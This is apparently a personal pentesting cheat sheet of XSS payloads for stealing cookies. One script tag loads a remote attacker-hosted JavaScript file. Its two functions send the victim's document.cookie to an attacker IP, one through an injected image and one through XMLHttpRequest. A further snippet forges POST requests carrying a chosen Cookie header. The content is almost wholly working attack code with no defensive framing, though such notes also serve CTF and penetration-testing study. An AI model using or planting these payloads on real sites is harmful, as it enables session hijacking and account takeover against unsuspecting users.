# xss steal cookie

```javascript
// request file using 
<script src='http://IP/kashz.js'> </script>

// file: kashz.js
function cookie1() {
    var img = document.createElement("img");
    img.src = "http://IP/?cookie=" + document.cookie;
    document.body.appendChild(img);
}

// 0xdf 
function cookie2() {
    var request = new XMLHttpRequest();
    request.open('GET', 'http://IP/?cookie='+document.cookie, true);
    request.send();
}
cookie1();
cookie2();
```

## Sending HTTP request via JS using XSS

```javascript
var request = new XMLHttpRequest();
var uri = ''
var cookie = ''
var params = '';
request.open('POST', uri, true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.setRequestHeader('Cookie', cookie);
request.send(params);
```
